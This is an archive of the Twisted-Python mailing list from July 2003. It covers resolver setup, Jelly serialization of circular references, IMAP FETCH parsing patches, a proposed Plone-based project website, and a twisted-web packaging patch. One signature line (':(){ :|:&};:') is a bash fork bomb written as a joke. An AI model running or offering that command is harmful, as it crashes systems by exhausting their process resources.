definition (in ReactorBase and IReactorPluggableResolver).

-- 
 ___________ ____________________________
| Screwtape | Reply-To: munged on Usenet |________ ______ ____ __ _  _   _
|
| "Triangle?" "Yes?" "Where am I?" "Down" "Thanks" "You're welcome" T&R 20030614
|



From andrew-twisted at puzzling.org  Tue Jul  8 06:55:01 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Tue, 8 Jul 2003 20:55:01 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708103817.GA17209@ferd2.thristian.org>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog> <20030708103817.GA17209@ferd2.thristian.org>
Message-ID: <20030708105501.GA17301@frobozz>

On Tue, Jul 08, 2003 at 08:38:18PM +1000, screwtape at froup.com wrote:
[...]
> Granted, ReactorBase.resolve() doesn't call _internalResolve if a new resolver
> has been installed (ReactorBase.installResolver()), but a quick grep
> of the Twisted source shows no mention of that method apart from its
> definition (in ReactorBase and IReactorPluggableResolver).

At a glance, it looks like you could do this, though:
    from twisted.names import client
    from twisted.internet import reactor

    reactor.installResolver(client.theResolver)

-Andrew.




From illumen at yahoo.com  Tue Jul  8 07:08:20 2003
From: illumen at yahoo.com (Rene Dudfield)
Date: Tue, 08 Jul 2003 21:08:20 +1000
Subject: [Twisted-Python] Finding peers.
In-Reply-To: <20030708074940.GA6207@lapdog>
References: <16136.11049.63479.337891@frank.xprtcc.com> <50E0FAB5-B080-11D7-BA53-003065D61A3E@froup.com> <20030708074940.GA6207@lapdog>
Message-ID: <3F0AA624.2050604@yahoo.com>

Tommi Virtanen wrote:

>On Mon, Jul 07, 2003 at 11:38:38PM +1000, Tim Allen wrote:
>  
>
>>DNS-SD (DNS based Service Discovery) is the easy part - it's just a  
>>standard way of organising DNS records such that a set of DNS queries  
>>can create a useful list of things to connect to. 'Implementing' DNS-SD  
>>support is not at all difficult, providing there exists an API to  
>>request PTR and SRV records, and providing you can add them to your DNS  
>>server.
>>    
>>
>
>	That exists, start reading from
>	twisted.internet.utils.SRVConnector.
>
>  
>
>>I haven't read the mDNS spec in detail, but the interaction between  
>>Twisted and the operating system's resolver seems complex. It'd be nice  
>>if Python had a DNS API more extensive than gethostbyname(), but it  
>>doesn't.
>>    
>>
>
>	That's why Twisted (and many other serious projects) are totally
>	ignoring the libc resolver. The API is just too limited.
>
>	Let me say that again. Twisted implements its own resolver that
>	talks UDP itself. gethostbyname() is just not usable.
>
>  
>
This is quite a supprising behaviour.  It should be printed in big 
flashing lights :)

There are many valid reasons to use the standard method.





From don at motorola.com  Tue Jul  8 18:01:07 2003
From: don at motorola.com (Don Hiatt)
Date: Tue, 8 Jul 2003 17:01:07 -0500
Subject: [Twisted-Python] simultaneously acting as a server and a client
In-Reply-To: <200307031611.h63GB3C7018183@ratthing-b246.strakt.com>
Message-ID: <FPEBLIAFGDEEOHHAGOKBIEPPCBAA.don@motorola.com>

Howdy twisters, :)

I implemented a client using the ClientFactory which
connects to a server and sends requests and receives 
replies. I currently have a simple command line interface
but would like to replace it with a webserver. Basically
what I would like to do is, start the webserver, connect
to another server, and when the user requests a specific
url, I would use the clientfactory to send the request
and then render the response in html.

Anyone have any suggestions on how I might go about doing
this? 

Thanks for you time.

Cheers,

don




From warner at lothar.com  Tue Jul  8 23:29:08 2003
From: warner at lothar.com (Brian Warner)
Date: Tue, 08 Jul 2003 20:29:08 -0700 (PDT)
Subject: [Twisted-Python] Controlling the classes being Jellied
References: <JAEDJDIBADCJHPFLNEDFIEEOCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030708.202908.59484738.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> I am having some problems finding my way around the API docs. The
> Copyable.getTypeToCopy() I found eventually, but I still can't find
> pb.setUnjellyableForClass in the docs even when I know what to look for.

You've probably already found it by now, but for the benefit of archive
readers: setUnjellyableForClass() is actually defined in the
twisted.spread.jelly module. Several PB things are defined in one of
(banana.py, jelly.py, flavors.py, spread.py) and then imported into the
others. I usually end up doing the "big grep" to find the actual definition:

 find ~/stuff/Twisted -type f |xargs grep setUnjellyableForClass |grep def

Some of it is for historical reasons, some of it has to do with the most
appropriate place for the implementation not always being the most
convenient place for use.

In general, banana.py is the lowest level token-to-bytestream layer,
jelly.py is the object serialization that sits above it. spread.py is where
the Broker class is implemented (as well as utility functions like
pb.Connect and pb.getObjectAt), and flavors.py covers the Referenceable /
Copyable / Cacheable subclasses.

cheers,
 -Brian



From ta-meyer at ihug.co.nz  Wed Jul  9 00:47:57 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 16:47:57 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>

[Tony]
> > For example, this command:
>     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
[Jp]
> Ideally, I'd like to see this parsed into a structure 
> resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
> 
> Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

This command now becomes:
    ["BODY(PEEK=1, HEADER=1, FIELDS=1, fielditems=['References', 'X-Ref'])",
'UID()']

Is this suitable?  I presume(d) from the structure that you suggested that
one way of handling this would be to then exec each element (having a
BODY(), UID function, and so on).

If there are problems with this, I'm happy to make changes.  I wrote it
against the RFC, so there may be things that need to be changed if there are
clients that do things illegally that are meant to be supported.  It also
_only_ supports rfc2060, not any extra additions, although if they are
simple ones or macros then it would be easy to simply append them to the
appropriate list.

Anyway, here it is, let me know what you think.

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030709/4fea0991/attachment.txt 

From ta-meyer at ihug.co.nz  Wed Jul  9 01:27:00 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 17:27:00 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE1@its-xchg4.massey.ac.nz>

>   Ideally, I'd like to see this parsed into a structure 
> resembling this:
> 
>     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
[...]
>   Would you be interested in patching the fetch methods to 
> generate a structure like the one I described above?

Further from my own message, attached is a slightly improved version that
expands the macros so that the user doesn't need to know about them.

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030709/0e58179e/attachment.txt 

From ta-meyer at ihug.co.nz  Wed Jul  9 02:17:19 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Wed, 9 Jul 2003 18:17:19 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130256546D@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE3@its-xchg4.massey.ac.nz>

> Further from my own message, attached is a slightly improved 
> version that expands the macros so that the user doesn't need 
> to know about them.

Third time lucky!  Both snippets of code I posted need one little change -
the return from fetch-att should be "return (query, '')" rather than simply
"return query" (pays to check the code first!).

The flaw as it stands, of course, is that whoever receives these atts has to
put them back together as they were so that the reply is correctly
formatted.  I suppose the correct action there is to also change the
__cbFetch function, but I'll leave this until I get some confirmation that
this is the right sort of thing.

=Tony Meyer




From warner at lothar.com  Wed Jul  9 04:51:49 2003
From: warner at lothar.com (Brian Warner)
Date: Wed, 09 Jul 2003 01:51:49 -0700 (PDT)
Subject: [LONG] Re: [Twisted-Python] Why do I get a _Dereference instance?
References: <JAEDJDIBADCJHPFLNEDFOEFNCAAA.pb_twisted@olga.mine.nu>
Message-ID: <20030709.015149.85705814.warner@lothar.com>

"Patrik Blommaskog" <pb_twisted at olga.mine.nu> writes:

> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)
> 
> gives the strange behavior

> While:
> 	def setCopyableState(self, state):
> 	    self.__dict__ = state
> 
> Gives the expected

> This feels like the twilight zone. Can somebody please tell me what is going
> on? I have attached the code for my experiment.

You're seeing an unfortunate artifact that results from the way circular
references are handled in the standard Jelly code. The problem has been
addressed somewhat in newjelly, but there are deeper issues which mean the
problem may not be possible to fix completely.

The following is a longish discussion of how jelly works and why this is
mostly unavoidable, followed by some design possibilities for other ways to
deal with it (newbanana enthusiasts are asked to read and comment upon the
last bit).


1: Mutable Containers

To start with, think about how a self-referential list must be unserialized.
This is a "mutable container", a category of objects which also includes
dictionaries. Something like:
  
  >>> a = [1,2]
  >>> a.append(a)
  >>> a.append(4)
  >>> a
  [1, 2, [...], 4]

When this is serialized, jelly (just like pickle) gets to the third element
and recognizes that this is something it has serialized before (or at least
it has started the serialization process). Rather than engage in pointless
infinite recursion, it inserts a 'dereference' marker that tells the
unserializer to insert a reference to something it already knows about.

(jelly, newjelly, and pickle all handle this slightly differently. oldjelly
puts explicit 'reference' markers on things that will need to be used later,
while newjelly uses an implicit reference counter that is incremented by
one. I use newjelly examples here because they are slightly easier to
follow.. oldjelly behaves pretty much the same way)

The resulting sexp stream (for newjelly) is:
  
  >>> from twisted.spread.newjelly import jelly
  >>> jelly(a)
  ['list', 1, 2, ['dereference', 0], 4]

The unserialization process handles one token at a time. It sees the "list"
token and creates an empty list, and stashes a reference in the "dereference
table" at index 0. It sees the number tokens and appends "1" and "2" to that
previously-empty list. Then it gets the "dereference" marker, looks up the
index in the dereference table, and ends up appending that list reference to
the list. Then it sees the "4" and appends a number, then it sees the
closing bracket and finishes up. This technique works for
arbitrarily-deeply-nested self-referential mutable container objects.

Note that the list is not really "complete" until the closing bracket, but
it needs to be referenceable before that point. Because we can create empty
lists and add things to them later, the list is referenceable starting with
the open bracket, and complete at the closing bracket.


2: Immutable Containers

Now think about a somewhat self-referential tuple. This is a "immutable
container". Of course it can't be directly self-referential: the cycle (in
graph-theory terms) must pass through a mutable container at some point,
otherwise the object could never be constructed in the first place.
  
  >>> b = [1,2]
  >>> c = (b,)
  >>> b.append(c)
  >>> c
  ([1, 2, ([...],)],)

This is serialized with similar dereference markers:

  >>> jelly(c)
  ['tuple', ['list', 1, 2, ['dereference', 0]]]

The difference this time is the immutable tuple (which needs to be
referenced later). It is not possible to create an empty tuple and add its
contents later. It is "referenceable" and "complete" at the same time,
unlike the list object.

To deal with this, we need a placeholder object. In jelly this is a
"_Tuple", which derives from twisted.persisted.crefutil.NotKnown . It acts
like a list while we add contents, but if we ever add the _Tuple to another
collection (like a dict or a list), the _Tuple remembers the collection
object and index to which it was added. When the closing bracket is
received, the _Tuple turns its list into a real tuple (making it "complete"
and "referenceable"), then walks through all the places that point to it and
fix them up. It does this by replacing the old _Tuple reference with a
reference to the new, complete tuple object. If the container that needed to
be fixed up is itself a _Tuple (or other NotKnown subclass), it might now be
complete, so it is given a chance to fix up *its* references, etc.

Cycles in the object graph are thus resolved in a chain, starting with the
node closest to the root object (the original thing passed to jelly()) and
propogating outwards to the deepest as-yet-unresolved container.

The salient points are: tuples and other "immutable containers" (which
currently includes bound instance methods) cannot be referenced until they
are complete, which requires all of their contents to be referenceable.
Placeholder objects and a post-completion fix-up step are used to deal with
this frustrating property.


3: Class Instances

Now consider regular instance objects, which can be described by a fully
qualified class name and a state dictionary. Clearly they are mutable
containers: you can trivially create cycles of nothing but instances:

  >>> class A: pass
  ... 
  >>> a1 = A(); a2 = A()
  >>> a1.a2 = a2; a2.a1 = a1
  >>> a1
  <__main__.A instance at 0x81abea4>
  >>> jelly(a1)
  ['__main__.A', ['dictionary', ['a2', ['__main__.A', ['dictionary', ['a1', ['dereference', 0]]]]]]]

The particular problem you're seeing is a misbehavior in oldjelly that was
addressed in newjelly. Oldjelly uses explicit reference tokens to mark
things that will be pointed to by dereference tokens later. The syntax of
those reference tokens is:

 ['reference', number, [thing being referenced]]

The oldjelly serialization of that pair of objects looks like this:
  
  >>> from twisted.spread.jelly import jelly as oldjelly
  >>> oldjelly(a1)
  ['reference', 1, ['__main__.A', ['dictionary', ['a2', ['__main__.A', ['dictionary', ['a1', ['dereference', 1]]]]]]]]

When oldjelly sees the 'reference' tag, it unserializes the "thing being
referenced", then stuffs a reference to it in the table. While that
unserialization is taking place (when the stack of things being unserialized
is actually: (reference 1), (instance a1), (a1.__dict__), (key 'a2'),
(instance a2), (a2.__dict__), (key 'a1')), the unjellying code hits the
"dereference 1" marker. Now, that reference hasn't been created yet: it
won't be until the enclosing object is finished. Oldjelly deals with this
using a _Deference object, which is another NotKnown subclass like _Tuple.
When the object is finally available, the _Dereference walks through the
places that point to it (in this case, a2.a1) and fix them up to point to
the correct object.

Until that point, a2.a1 is a _Dereference object. After the object is
complete, it is the correct A instance.

To perform that fixup, the _Dereference knows the dictionary it was added
to. Of course, it doesn't know about any *other* dictionaries that the
_Dereference might have been copied into, such as the one you used here:

> 	def setCopyableState(self, state):
> 	    self.__dict__.update(state)

The original 'state' dictionary is fixed-up with the correct instance
reference, but the independent __dict__ is not, so you wind up seeing the
_Dereference object that should have been hidden.


Newjelly deals with this differently, but is vulnerable to a similar
problem.

In newjelly, there are no explicit 'reference' tags. Instead, every sexp
that creates a new container object will increment the implicit reference
number. We mainly did this to remove the overhead of those reference tags,
both space (consumed in the bytestream), and computation (spent trying to
decide whether the object was going to be referenced more than once before
including the reference tag). It was far easier to simply track references
to *everything*, on both sides of the wire.

An important side-effect was that dereference tags will now *always* have a
matching reference, which is inserted into the reference table as soon as
the opening bracket is processed. The new unjelly_dereference() code
eliminated _Dereference altogether.

The (incomplete) instance object is referenceable as soon as the opening
bracket has been processed. The same is true for the state dictionary. This
means that the state handed to the .unjellyFor() method (and therefore to
.setCopyableState()) will reference the correct (although incomplete)
instance objects. No fixups are necessary, so there isn't a chance to fix-up
the wrong dictionary if "self.__dict__.update(state)" is used.

As a result, this pair of objects, when transported by newjelly, should
arrive without weird _Dereference artifacts, fixing your immediate problem.


4: the Remaining Problem

Newjelly is still vulnerable to a similar problem that results when an
immutable container (which cannot be fully resolved when the instance is
complete) is part of the instance's state:
  
  >>> a = A()
  >>> t = (1,2,a,4)
  >>> a.t = t
  >>> jelly(t)
  ['tuple', 1, 2, ['__main__.A', ['dictionary', ['t', ['dereference', 0]]]], 4]

Here, the tuple cannot be created until the '4' has been processed, so it is
neither complete nor referenceable when the instance's state is being
created. As a result, that state will have a _Tuple object that will
eventually be replaced by the real tuple. This means that the _Tuple needs
to remember that collection object "a", key "t" (a.t) needs to be fixed up
when the _Tuple is resolved. As before, if the _Tuple reference is copied
into a different dictionary, this fix-up will miss the real target, and the
instance will be left with a spurious _Tuple instance.

So, even though newjelly fixes the "instance.foo = instance" problem, it is
still vulnerable to certain "instance.foo = tuple" problems. Of course, this
is only when you use "self.__dict__.update(state)", so the simplest answer
is to just not do that :).

The more fundamental problem here is in presenting a coherent object graph
to the functions that are involved in creating that object graph. When
.setCopyableState() is called, the state dictionary may contain unresolved
references, and it may contain references to objects that are not yet
complete (other instances which have not yet had their own .setCopyableState
called). This puts a restriction upon those methods: they may not be able to
use all of their own state, or look inside related objects, or call methods
on related objects.


5: Possibilities  (newbanana people wake up)

I think this is a Hard Problem, and it isn't generally possible to figure
out a "correct" order in which to run these functions. It is very much like
running finalization routines during object destruction. It may be possible
to implement phases of deserialization.. .setCopyableState() could be run as
soon as the state dictionary is full of referenceable objects (putting it
off until all tuples were created, for example), and then call some other
method after all the objects are complete. Perhaps having a more uniform
scheme for indicating "incomplete" objects would help, one where instances
could register callbacks to be run after a certain list of other objects are
complete. The unserializer would then have to evaluate the callback requests
and come up with a legal sequence in which they could be executed, a
potentially impossible task if there are cycles in the dependency graph.

Some smaller-scale solutions might be worth exploring:

 Instead of things like _Tuple just storing a (collection,key) pair and
 updating that reference blindly, perhaps they should call a
 .resolvedReference(key, value) method. This would give the instance a
 chance to run some code and do something useful with the newly available
 data.

 gc.get_referrers() could be used to find the places which point to the
 _Tuple, then any which were instances could have a .resolvedReference
 method called (and any which were lists/dicts could be searched for the
 places that use the _Tuple, and then updated in place). This would probably
 fix the __dict__.update problem, at the expense of performance
 (get_referrers is very slow) and the inclusion of an uncomfortable amount
 of magic.

 The newbanana scheme (sandbox/warner/slicer.py) uses Deferreds as
 placeholder objects. Arbitrary callbacks can be added, which might make it
 easier to handle the "self.__dict__.update(state)" pattern.



Anyway, that was probably a much longer answer than you were looking for,
but I thought it important to explain the larger problem (which remains
unfixed) rather than simply saying "it's been fixed in newjelly", or "don't
use __dict__.update".

hope that helps more than it confuses,
 -Brian



From exarkun at twistedmatrix.com  Wed Jul  9 06:04:48 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Wed, 9 Jul 2003 06:04:48 -0400
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F13023945D7@its-xchg4.massey.ac.nz> <1ED4ECF91CDED24C8D012BCF2B034F130212AADD@its-xchg4.massey.ac.nz>
Message-ID: <20030709100438.GA7562@intarweb.us>

On Wed, Jul 09, 2003 at 04:47:57PM +1200, Tony Meyer wrote:
> [Tony]
> > > For example, this command:
> >     0003 FETCH 1 BODY.PEEK[HEADER.FIELDS (References X-Ref)] UID
> [Jp]
> > Ideally, I'd like to see this parsed into a structure 
> > resembling this:
> > 
> >     [Header(peek=1, name=1, value=1, ['References', 'X-Ref']), UID()]
> > 
> > Would you be interested in patching the fetch methods to 
> > generate a structure like the one I described above?
> 
> This command now becomes:
>     ["BODY(PEEK=1, HEADER=1, FIELDS=1, fielditems=['References', 'X-Ref'])",
> 'UID()']
> 
> Is this suitable?  I presume(d) from the structure that you suggested that
> one way of handling this would be to then exec each element (having a
> BODY(), UID function, and so on).

  Eeep :o  This isn't quite what I was going for... The exec stage is a big
no-no from my point of view.  I'd rather have Body be a class, with peek,
fields, etc as boolean attributes on its instances.  This avoids having to
build up strings in the protocol code, and avoids forcing client code to
turn it back into something easily parsed.  I guess I should give a couple
examples.

  The body class might be defined something like this (and instantiated as
above, with proper case normalization and removal of the quotes making the
whole thing a string):

    class Body:
        name = 'body'
	def __init__(self, peek=False, header=False, fields=False, **kwargs):
            self.peek, self.header, self.fields = peek, header, fields
            self.__dict__.update(kwargs)

        def __str__(self):
            base = 'BODY'
            if self.peek:
                base = 'BODY.PEEK'
            opt = ''
            if self.header:
                if self.fields:
                    opt = '[HEADER.FIELDS %s]' % ' '.join(self.fielditems)
                else:
                    opt = '[HEADER %s]' % ' '.join(self.fielditems)
            elif # ... something else
                ...
            return '%s%s' % (base, opt)

  Client code could expect to use it like this:

    def fetch(self, msgs, queryParts, uid):
        r = {}
        for q in queryParts:
            r[q] = getattr(self, 'fetch_' + q.name)(msgs, q, uid)

    def fetch_body(self, msgs, query, uid):
        if not query.peek:
            # mark specified messages as seen
        if query.header:
            if query.fields:
                ...

  There's a clear problem with the way Body.__str__ is implemented (no
quoting -- but maybe this could be fixed with a DB-API-style quoting
tactic), and obviously large parts of the implementation are missing, but I
hope this gets my idea across a little more clearly.  I am dead tired at the
moment, I just wanted to respond quickly to clear up the point of strings vs
classes.  If I still haven't succeeded in conveying all my thoughts clearly,
please let me know and I'll try again :)

> 
> If there are problems with this, I'm happy to make changes.  I wrote it
> against the RFC, so there may be things that need to be changed if there are
> clients that do things illegally that are meant to be supported.  It also
> _only_ supports rfc2060, not any extra additions, although if they are
> simple ones or macros then it would be easy to simply append them to the
> appropriate list.

  This sounds fine.  I do like that it moves the macro processing out of the
mailbox and into the protocol code.

> 
> Anyway, here it is, let me know what you think.

  The only other thing I wanted to mention was that scary regular
expression.  I haven't even attempted to decipher it yet, but I was curious
if you pulled it out of or based it off of one of the RFCs, or if you came
up with it yourself?  In my experience expressions that long tend to be
wrong in unexpected and surprising ways, and I'm not inclined to trust them
without careful analysis, or at least the knowledge that they come from an
authoritative source (and even then, ensuring the proper meaning survived
into the translation to python REs is a pain...)

  All that said, thanks for the patch!  I'm looking forward to the next
revision :)

  Jp

-- 
        "I quite agree with you," said the Duchess; "and the moral of
that is -- Be what you would seem to be' -- or, if you'd like it put
more simply -- Never imagine yourself not to be otherwise than what it
might appear to others that what you were or might have been was not 
otherwise than what you had been would have appeared to them to be
otherwise.'"       -- Lewis Carrol, "Alice in Wonderland"
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030709/499cd46e/attachment.pgp 

From lafou at wanadoo.fr  Wed Jul  9 12:50:31 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 18:50:31 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
Message-ID: <1057769430.2859.64.camel@biproc>

Hi all

we spoke last month about the twistedmatrix website. It has a great
advantage : it demonstrates that twisted.web works for a production
server.

Besides, TwistedMatrix popularity grows day by day, and I think we need
a different approach. The mailing list should be only used by
developers, or developments related to twisted.

I propose you a brand new website based on plone which would help to
create a bigger and more reactive community. I've started developing
one.

Only the products links are available, but you can already register and
log in to add some content. For those who are using mozilla > 1.3.1 or
IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
editor). Epoz allows you to manage content with a wysiwyg editor whitout
any plugin.

Feel free to send some comments.

adress :

http://twistedmatrix.dyndns.org

I you like it, I would be proud to give to source code so that you can
host the REAL website (I can't here).

(glyph, email me personnaly if you want an admin access to test
workflows)

Philippe




From 2002 at weholt.org  Wed Jul  9 13:51:50 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Wed, 9 Jul 2003 19:51:50 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
References: <1057769430.2859.64.camel@biproc>
Message-ID: <001701c34642$c775d540$0401a8c0@razor>

Very nice!! But it says it's powered by Twisted and Plone? Isn't Plone a
Zope-product? How??  Is there something I don't know here .... ??

Thomas

----- Original Message -----
From: "Philippe Lafoucri?re" <lafou at wanadoo.fr>
To: <twisted-python at twistedmatrix.com>
Sent: Wednesday, July 09, 2003 6:50 PM
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments


> Hi all
>
> we spoke last month about the twistedmatrix website. It has a great
> advantage : it demonstrates that twisted.web works for a production
> server.
>
> Besides, TwistedMatrix popularity grows day by day, and I think we need
> a different approach. The mailing list should be only used by
> developers, or developments related to twisted.
>
> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.
>
> Only the products links are available, but you can already register and
> log in to add some content. For those who are using mozilla > 1.3.1 or
> IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
> editor). Epoz allows you to manage content with a wysiwyg editor whitout
> any plugin.
>
> Feel free to send some comments.
>
> adress :
>
> http://twistedmatrix.dyndns.org
>
> I you like it, I would be proud to give to source code so that you can
> host the REAL website (I can't here).
>
> (glyph, email me personnaly if you want an admin access to test
> workflows)
>
> Philippe
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From lafou at wanadoo.fr  Wed Jul  9 14:50:17 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 20:50:17 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <001701c34642$c775d540$0401a8c0@razor>
References: <1057769430.2859.64.camel@biproc>
	 <001701c34642$c775d540$0401a8c0@razor>
Message-ID: <1057776616.2860.66.camel@biproc>

On Wed, 2003-07-09 at 19:51, Thomas Weholt wrote:
> Very nice!! But it says it's powered by Twisted and Plone? Isn't Plone a
> Zope-product? How??  Is there something I don't know here .... ??
> 
> Thomas


Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts of the site would 
use twisted products (still to define).





From tv at twistedmatrix.com  Wed Jul  9 14:38:34 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 9 Jul 2003 21:38:34 +0300
Subject: [Twisted-Python] [PATCH] Bugfixing the twisted-web (not twisted.web) package
Message-ID: <20030709183834.GA10828@lapdog>

	Hi. Couldn't find anything newer than 0.3 of
	Moshe's twisted-web package. Tried to use it,
	it really didn't work. Here's a patch.

diff -Naur twisted-web-0.3/debian/default twisted-web-0.3.1/debian/default
--- twisted-web-0.3/debian/default	2002-11-10 10:50:48.000000000 +0200
+++ twisted-web-0.3.1/debian/default	2003-07-09 14:09:58.000000000 +0300
@@ -1,5 +1,5 @@
 pidfile=/var/run/twisted-web.pid
 rundir=/var/lib/twisted-web/
-file=/etc/twisted-web
+file=/etc/twisted-web/twisted-web
 logfile=/var/log/twisted-web.log
 more_args=--no_save 
diff -Naur twisted-web-0.3/debian/init.d twisted-web-0.3.1/debian/init.d
--- twisted-web-0.3/debian/init.d	2002-11-10 10:50:02.000000000 +0200
+++ twisted-web-0.3.1/debian/init.d	2003-07-09 11:50:32.000000000 +0300
@@ -4,7 +4,7 @@
 
 pidfile=/var/run/twisted-web.pid
 rundir=/var/lib/twisted-web/
-file=/etc/twisted-web
+file=/etc/twisted-web/twisted-web
 logfile=/var/log/twisted-web.log
 more_args=--no_save
 
diff -Naur twisted-web-0.3/twisted-web twisted-web-0.3.1/twisted-web
--- twisted-web-0.3/twisted-web	2002-11-10 10:33:11.000000000 +0200
+++ twisted-web-0.3.1/twisted-web	2003-07-09 14:14:06.000000000 +0300
@@ -1,6 +1,6 @@
 from twisted.web import script, static, server, distrib, twcgi
-from twistedin.internet import app
-import pwd, grp
+from twisted.internet import app
+import pwd, grp, glob
 
 root = static.File('/var/www')
 root.processors = {
@@ -56,8 +56,8 @@
 site = server.Site(root, logPath=logPath)
 
 # Set user/group to run under
-uid = pwd.getpwnam('www-data')
-gid = grp.getgrnam('www-data')
+uid = pwd.getpwnam('www-data')[2]
+gid = grp.getgrnam('www-data')[2]
 
 
 application = app.Application("web", uid=uid, gid=gid)


-- 
:(){ :|:&};:



From tpherndon at mindspring.com  Wed Jul  9 15:28:12 2003
From: tpherndon at mindspring.com (Peter Herndon)
Date: Wed, 9 Jul 2003 15:28:12 -0400
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
 comments
In-Reply-To: <1057776616.2860.66.camel@biproc>
Message-ID: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>

Philippe,

> Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts 
> of the site would
> use twisted products (still to define).

Why do you believe we need the content management features of Plone?  
What is your rationale?  And, perhaps more to the point, perhaps you 
should consider rewriting the functionality using Twisted, if you deem 
the features necessary.  After all, the Twisted website is the premier 
working advertisement for the Twisted code, at least at the moment.  If 
we don't eat our own dogfood, that will reflect very poorly on Twisted.

Please understand, I am not trying to belittle Twisted in any way, but 
the website is the one working example of Twisted that I know about.  
In all the other cases listed under "Success Stories", Twisted is being 
used in its role as framework-under-the-covers, and is not on public 
display.  Having a public-accessible example of Twisted allows the 
potential user to "kick the tires" before buying.

Reinventing the wheel that is Plone is by no means a trivial task, yet 
I believe that moving to a solution that is not powered by Twisted 
would be a very bad move in terms of public relations.  Of course, 
writing a bridge layer to make Plone run on top of Twisted would be 
really cool, too.  Insane, maybe, but cool.  ;)

For what it might be worth, I would suggest using Twisted in all areas 
that you possibly can.  For instance, Twisted has an NNTP server.  So, 
why aren't we (or are we, I don't know?) mirroring this mailing list as 
a newsgroup?  Stuff like this provides great advertising opportunities.

Thoughts, anyone?

---Peter Herndon





From jon at totient.demon.co.uk  Wed Jul  9 15:45:34 2003
From: jon at totient.demon.co.uk (Jon Dyte)
Date: Wed, 9 Jul 2003 20:45:34 +0100
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
In-Reply-To: <1057769430.2859.64.camel@biproc>
References: <1057769430.2859.64.camel@biproc>
Message-ID: <200307092045.35015.jon@totient.demon.co.uk>

Phillippe

Looks like a good idea.
what we all want to know, is are you running Zope on top of twisted for this 
site? Or is this apache/zserver etc etc?

cheers

Jon




On Wednesday 09 Jul 2003 5:50 pm, Philippe Lafoucri?re wrote:
> Hi all
>
> we spoke last month about the twistedmatrix website. It has a great
> advantage : it demonstrates that twisted.web works for a production
> server.
>
> Besides, TwistedMatrix popularity grows day by day, and I think we need
> a different approach. The mailing list should be only used by
> developers, or developments related to twisted.
>
> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.
>
> Only the products links are available, but you can already register and
> log in to add some content. For those who are using mozilla > 1.3.1 or
> IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
> editor). Epoz allows you to manage content with a wysiwyg editor whitout
> any plugin.
>
> Feel free to send some comments.
>
> adress :
>
> http://twistedmatrix.dyndns.org
>
> I you like it, I would be proud to give to source code so that you can
> host the REAL website (I can't here).
>
> (glyph, email me personnaly if you want an admin access to test
> workflows)
>
> Philippe
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From lafou at wanadoo.fr  Wed Jul  9 15:55:05 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
